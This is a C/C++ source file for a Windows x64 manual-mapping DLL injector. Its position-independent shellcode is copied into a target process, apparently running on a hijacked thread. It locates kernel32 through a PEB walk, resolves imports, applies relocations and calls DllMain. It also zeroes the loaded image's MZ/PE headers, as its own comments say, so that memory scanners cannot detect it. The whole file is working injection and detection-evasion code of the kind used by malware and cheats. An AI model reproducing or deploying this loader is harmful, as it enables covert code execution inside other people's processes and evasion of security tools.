// language: C, file: Loader/shellcode.cpp, target: Windows 11, MSVC x64
//
// Position-independent x64 manual-mapper payload ("shellcode").
//
// Lives in its own section (.scode) and is copied Raw into the target process
// at inject time. This file must therefore produce strictly position-
// independent machine code:
//   - NO string literals          (.rdata RIP-relative refs would break when copied)
//   - NO static/global data       (absolute/SIB refs would break)
//   - NO CRT / memcpy / SEH / GS  (external calls or cookie checks)
//   - NO switch tables            (jump tables live in .rdata)
//   - NO /GL cross-TU inlining (compiled per-file: /GS-, no /GL, no LTCG)
//
// All inputs arrive in SCodeArgs (thread parameter); kernel32 is located by
// walking the target PEB at runtime.
//
// Build flags for this file (set in Loader.vcxproj):
//   <Optimization>MaxSpeed</Optimization> <FunctionLevelLinking>true</FunctionLevelLinking>
//   <BufferSecurityCheck>false</BufferSecurityCheck>
//   <ExceptionHandling>false</ExceptionHandling> <WholeProgramOptimization>false</WholeProgramOptimization>
//   <RuntimeLibrary>MultiThreaded</RuntimeLibrary> <ControlFlowGuard>false</ControlFlowGuard>

#include "shellcode.h"
#include <windows.h>
#include <winnt.h>
#include <intrin.h>

// Keep the .scode payload section present and executable in the final image.
#pragma comment(linker, "/SECTION:.scode,ERW")

namespace
{
    // ---- tiny PIC-safe helpers -------------------------------------------

    // Case-insensitive compare: want (len bytes) vs name (ASCII, null- or
    // len-terminated). Returns 0 on match.
    int NameCmp(const char* name, const char* want, int len)
    {
        for (int i = 0; i < len; i++)
        {
            char c = name[i];
            if (c >= 'a' && c <= 'z') c -= 32;
            char w = want[i];
            if (w >= 'a' && w <= 'z') w -= 32;
            if (c != w) return -1;
        }
        return 0;
    }

    // Compare a UTF-16 module name (BaseDllName.Buffer) against an ASCII want.
    int NameCmpW(const wchar_t* name, const char* want, int len)
    {
        for (int i = 0; i < len; i++)
        {
            wchar_t c = name[i];
            if (c >= L'a' && c <= L'z') c -= 32;
            char w = want[i];
            if (w >= 'a' && w <= 'z') w -= 32;
            if (c != (wchar_t)w) return -1;
        }
        return 0;
    }

    // PEB walk: find a module by its BaseDllName (ASCII fragment, matche case-
    // insensitively against the UTF-16 name). Returns its DllBase or 0.
    uintptr_t FindModule(const char* want, int wantLen)
    {
#ifdef _M_X64
        uintptr_t peb = (uintptr_t)__readgsqword(0x60);
        if (!peb) return 0;
        uintptr_t ldr = *(uintptr_t*)(peb + 0x18);
        if (!ldr) return 0;

        // _PEB_LDR_DATA.InMemoryOrderModuleList (x64: +0x20)
        uintptr_t head = ldr + 0x20;
        uintptr_t node = *(uintptr_t*)head;      // Flink of first entry
        while (node && node != head)
        {
            // From the InMemoryOrderLinks node (= entry+0x10):
            //   DllBase            entry+0x30 -> node+0x20
            //   BaseDllName.Length entry+0x58 -> node+0x48  (bytes, incl. null)
            //   BaseDllName.Buffer entry+0x60 -> node+0x50
            uintptr_t dllBase = *(uintptr_t*)(node + 0x20);
            WORD  nameLen = *(WORD*)(node + 0x48);          // bytes, incl nulls
            uintptr_t nameBuf = *(uintptr_t*)(node + 0x50);
            if (dllBase && nameBuf && nameLen >= (WORD)(wantLen * 2))
            {
                if (NameCmpW((const wchar_t*)nameBuf, want, wantLen) == 0)
                    return dllBase;
            }
            node = *(uintptr_t*)node;                       // Flink
        }
#endif
        return 0;
    }

    // Resolve an export by ASCII name from a module's base. Returns 0/addr.
    uintptr_t GetExport(uintptr_t moduleBase, const char* want, int wantLen)
    {
        if (!moduleBase) return 0;
        IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)moduleBase;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
        IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(moduleBase + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

        IMAGE_DATA_DIRECTORY* exp = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (!exp->VirtualAddress || !exp->Size) return 0;

        IMAGE_EXPORT_DIRECTORY* dir = (IMAGE_EXPORT_DIRECTORY*)(moduleBase + exp->VirtualAddress);
        DWORD* names     = (DWORD*)(moduleBase + dir->AddressOfNames);
        WORD*  ordinals  = (WORD*)(moduleBase + dir->AddressOfNameOrdinals);
        DWORD* functions = (DWORD*)(moduleBase + dir->AddressOfFunctions);

        for (DWORD i = 0; i < dir->NumberOfNames; i++)
        {
            const char* name = (const char*)(moduleBase + names[i]);
            // match exact null-terminated name
            bool match = true;
            for (int j = 0; j < wantLen; j++)
            {
                char c = name[j];
                if (c >= 'a' && c <= 'z') c -= 32;
                char w = want[j];
                if (w >= 'a' && w <= 'z') w -= 32;
                if (c != w) { match = false; break; }
            }
            if (match && name[wantLen] == '\0')
                return moduleBase + functions[ordinals[i]];
        }
        return 0;
    }
}

// ---------------------------------------------------------------------------
// Mapper body. RCX = SCodeArgs* (thread parameter). Pure PIC.
// ---------------------------------------------------------------------------
__declspec(code_seg(".scode"))
__declspec(noinline)
DWORD WINAPI ScodeMain(LPVOID param)
{
    SCodeArgs* a = (SCodeArgs*)param;
    if (!a)
        return 2;

    // From here on, never return on a hijacked thread: the scratch stack holds
    // a null return address, so a bare `return` would jump to 0 and take the
    // whole target down. Signal through args and park instead.
    if (!a->imageBase || !a->entryRva)
    {
        a->result = 2; a->done = 1;
        while (!a->exitFlag) _mm_pause();
        return 2;
    }

    a->ready = 1;
    a->stage = 1;                       // entered payload

    const uintptr_t imageBase = a->imageBase;
    const uintptr_t delta     = a->delta;

    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)imageBase;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
    {
        a->result = 3; a->done = 1;
        while (!a->exitFlag) _mm_pause();
        return 3;
    }
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(imageBase + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
    {
        a->result = 4; a->done = 1;
        while (!a->exitFlag) _mm_pause();
        return 4;
    }

    // ---- snapshot everything we need from the headers, then wipe them ------
    // A headerless anonymous image has no MZ/PE signature for a memory scanner
    // to key on. Directories and section attributes are copied first because
    // they live inside the region we are about to zero. The e_lfanew field and
    // the optional header are PRESERVED: DllMain needs DataDirectory[5] (.pdata)
    // to register exception unwinding via RtlAddFunctionTable.
    const DWORD sizeOfHeaders = a->sizeOfHeaders;
    const DWORD entryRva      = a->entryRva;

    const BYTE* optStart = (const BYTE*)&nt->OptionalHeader;
    const DWORD optSize  = (DWORD)sizeof(IMAGE_OPTIONAL_HEADER64);
    const BYTE* optEnd   = optStart + optSize;

    DWORD impRva, impSize, relRva, relSize;
    impRva  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    impSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
    relRva  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    relSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

    // section table copy: {VirtualAddress, VirtualSize, Characteristics}
    struct SecInfo { DWORD va; DWORD vs; DWORD ch; };
    SecInfo secs[16];
    const DWORD secCount = nt->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER* sh = IMAGE_FIRST_SECTION(nt);
    for (DWORD i = 0; i < secCount && i < 16; i++)
    {
        secs[i].va = sh[i].VirtualAddress;
        secs[i].vs = sh[i].Misc.VirtualSize ? sh[i].Misc.VirtualSize : sh[i].SizeOfRawData;
        secs[i].ch = sh[i].Characteristics;
    }

    for (DWORD i = 0; i < sizeOfHeaders && i < 0x1000; i++)
    {
        BYTE* p = (BYTE*)imageBase + i;
        // keep e_lfanew (0x3C) — DllMain navigates from it
        if (p >= (BYTE*)dos + 0x3C && p < (BYTE*)dos + 0x40) continue;
        // keep the optional header — holds DataDirectory[5] (.pdata)
        if (p >= optStart && p < optEnd) continue;
        *p = 0;
    }
    a->stage = 2;                       // headers wiped (MZ/PE gone, .pdata reachable)

    // Locate kernel32 and the APIs we need.
    char k32Name[] = { 'K','E','R','N','E','L','3','2' };
    char loadName[] = { 'L','o','a','d','L','i','b','r','a','r','y','A' };
    char getProcName[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s' };
    char vpName[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t' };

    uintptr_t k32 = FindModule(k32Name, 8);
    if (!k32)
    {
        a->result = 5; a->done = 1;
        while (!a->exitFlag) _mm_pause();
        return 5;
    }

    typedef uintptr_t(__stdcall* LoadLibraryA_t)(const char*);
    typedef uintptr_t(__stdcall* GetProcAddress_t)(uintptr_t, const char*);
    typedef BOOL(__stdcall* VirtualProtect_t)(void*, size_t, DWORD, DWORD*);

    LoadLibraryA_t    pLoadLibraryA   = (LoadLibraryA_t)GetExport(k32, loadName, 12);
    GetProcAddress_t  pGetProcAddress = (GetProcAddress_t)GetExport(k32, getProcName, 14);
    VirtualProtect_t  pVirtualProtect = (VirtualProtect_t)GetExport(k32, vpName, 14);
    if (!pLoadLibraryA || !pGetProcAddress || !pVirtualProtect)
    {
        a->result = 6; a->done = 1;
        while (!a->exitFlag) _mm_pause();
        return 6;
    }

    a->stage = 3;                       // kernel32 + APIs resolved

    // ---- resolve imports ---------------------------------------------------
    if (impRva && impSize)
    {
        IMAGE_IMPORT_DESCRIPTOR* imp =
            (IMAGE_IMPORT_DESCRIPTOR*)(imageBase + impRva);

        while (imp->Name)
        {
            const char* dllName = (const char*)(imageBase + imp->Name);
            uintptr_t hMod = pLoadLibraryA(dllName);
            if (!hMod)
            {
                a->result = 7; a->done = 1;
                for (;;) _mm_pause();
            }

            DWORD_PTR* oft = imp->OriginalFirstThunk
                ? (DWORD_PTR*)(imageBase + imp->OriginalFirstThunk)
                : (DWORD_PTR*)(imageBase + imp->FirstThunk);
            DWORD_PTR* iat = (DWORD_PTR*)(imageBase + imp->FirstThunk);

            while (*oft)
            {
                DWORD_PTR val = *oft;
                uintptr_t func = 0;

                // IMAGE_SNAP_BY_ORDINAL64: high bit set on x64 thunks.
                if (val & 0x8000000000000000ULL)
                {
                    func = pGetProcAddress(hMod, (const char*)(val & 0xFFFF));
                }
                else
                {
                    IMAGE_IMPORT_BY_NAME* ibn =
                        (IMAGE_IMPORT_BY_NAME*)(imageBase + (val & 0x7FFFFFFFULL));
                    func = pGetProcAddress(hMod, (const char*)ibn->Name);
                }
                if (!func)
                {
                    a->result = 8; a->done = 1;
                    for (;;) _mm_pause();
                }

                *iat = func;
                oft++;
                iat++;
            }
            imp++;
        }
    }

    a->stage = 4;                       // imports resolved

    // ---- apply base relocations -------------------------------------------
    if (relRva && relSize && delta != 0)
    {
        BYTE* block = (BYTE*)(imageBase + relRva);
        BYTE* end   = block + relSize;
        while (block + 8 <= end)
        {
            DWORD pageRva = *(DWORD*)block;
            DWORD blockSz = *(DWORD*)(block + 4);
            if (blockSz == 0) break;

            WORD* entry = (WORD*)(block + 8);
            DWORD n = (blockSz - 8) / 2;
            for (DWORD i = 0; i < n; i++)
            {
                WORD type = entry[i] >> 12;
                WORD off  = entry[i] & 0xFFF;
                if (type == IMAGE_REL_BASED_DIR64)
                    *(uintptr_t*)(imageBase + pageRva + off) += delta;
            }
            block += blockSz;
        }
    }

    a->stage = 5;                       // relocations applied

    // ---- drop RWX before the entry point ever executes ---------------------
    for (DWORD i = 0; i < secCount && i < 16; i++)
    {
        const DWORD ch = secs[i].ch;
        DWORD prot = PAGE_READONLY;
        if (ch & IMAGE_SCN_MEM_WRITE) prot = PAGE_READWRITE;
        if (ch & IMAGE_SCN_MEM_EXECUTE) prot = PAGE_EXECUTE_READ;
        if ((ch & IMAGE_SCN_MEM_WRITE) && (ch & IMAGE_SCN_MEM_EXECUTE))
            prot = PAGE_EXECUTE_READWRITE;
        DWORD old = 0;
        if (secs[i].vs)
            pVirtualProtect((void*)(imageBase + secs[i].va), secs[i].vs, prot, &old);
    }

    a->stage = 6;                       // section protections applied

    // ---- call entry point --------------------------------------------------
    typedef BOOL(WINAPI* DllMain_t)(HINSTANCE, DWORD, LPVOID);
    DllMain_t DllMain = (DllMain_t)(imageBase + entryRva);
    a->stage = 7;                       // calling entry point
    BOOL ok = DllMain((HINSTANCE)imageBase, DLL_PROCESS_ATTACH, NULL);
    a->stage = 8;                       // entry returned

    a->result = ok ? 1 : 9;
    a->done = 1;

    // Hijack path: the loader suspends this thread here and restores the
    // original context, so the loop is simply abandoned mid-spin.
    // CRT path: the loader raises exitFlag and this returns, ending the thread
    // cleanly before the loader frees this region.
    while (!a->exitFlag)
        _mm_pause();
    return 0;
}

// ---------------------------------------------------------------------------
// Extraction — normal code, default .text (NOT part of the copied payload).
// ---------------------------------------------------------------------------
bool GetShellcodeData(const BYTE** outPtr, size_t* outSize)
{
    uintptr_t base = (uintptr_t)GetModuleHandleW(nullptr);
    if (!base) return false;

    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;

    uintptr_t fnAddr = (uintptr_t)&ScodeMain;
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++)
    {
        uintptr_t sStart = base + sec[i].VirtualAddress;
        size_t    sSize  = sec[i].Misc.VirtualSize;
        if (!sSize) sSize = sec[i].SizeOfRawData;
        if (sSize && fnAddr >= sStart && fnAddr < sStart + sSize)
        {
            *outPtr  = (const BYTE*)(sStart + (fnAddr - sStart));
            *outSize = sSize - (fnAddr - sStart);
            return true;
        }
    }
    return false;
}